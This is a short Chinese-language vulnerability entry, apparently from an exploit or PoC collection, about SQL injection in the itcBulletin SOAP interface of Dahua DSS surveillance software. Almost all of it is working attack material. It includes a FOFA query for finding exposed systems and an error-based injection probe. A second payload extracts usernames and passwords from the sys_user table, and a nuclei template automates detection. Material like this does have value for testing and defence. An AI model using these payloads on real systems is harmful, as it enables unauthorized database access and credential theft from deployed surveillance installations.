## 大华DSS itcBulletin SQL 注入漏洞
大华DSS数字监控系统itcBulletin接口存在SQL注入漏洞，攻击者可以利用该漏洞获取数据库敏感信息。

## fofa
```
app="dahua-DSS"
```

## poc
```
POST /portal/services/itcBulletin?wsdl HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 345
Accept-Encoding: gzip

<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
      <netMarkings>
        (updatexml(1,concat(0x7e,md5(102103122),0x7e),1))) and (1=1
      </netMarkings>
    </ns1:deleteBulletin>
  </s11:Body>
</s11:Envelope>


POST /portal/services/itcBulletin?wsdl HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
 
<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
      <netMarkings>
        (updatexml(1,concat(0x7e,(select substr(group_concat(login_name, " ",login_pass),1,30) from sys_user),0x7e),1))) and (1=1
      </netMarkings>
    </ns1:deleteBulletin>
  </s11:Body>
</s11:Envelope>

```

## nuclei poc
```
id: dahua-dss-itcBulletin-sqli
info:
  name: 大华DSS itcBulletin SQL注入漏洞
  author: fgz
  severity: high
  description: 大华DSS数字监控系统itcBulletin接口存在SQL注入漏洞，攻击者可以利用该漏洞获取数据库敏感信息。
  metadata:
    fofa-query: app="dahua-DSS"

requests:
  - raw:
      - |+
        POST /portal/services/itcBulletin?wsdl HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        
        <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
          <s11:Body>
            <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
              <netMarkings>
                (updatexml(1,concat(0x7e,md5(102103122),0x7e),1))) and (1=1
              </netMarkings>
            </ns1:deleteBulletin>
          </s11:Body>
        </s11:Envelope>

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==500 && contains(body,"error code [1105]") && contains(body,"6cfe798ba8e5b85feb50164c59f4bec")'
```
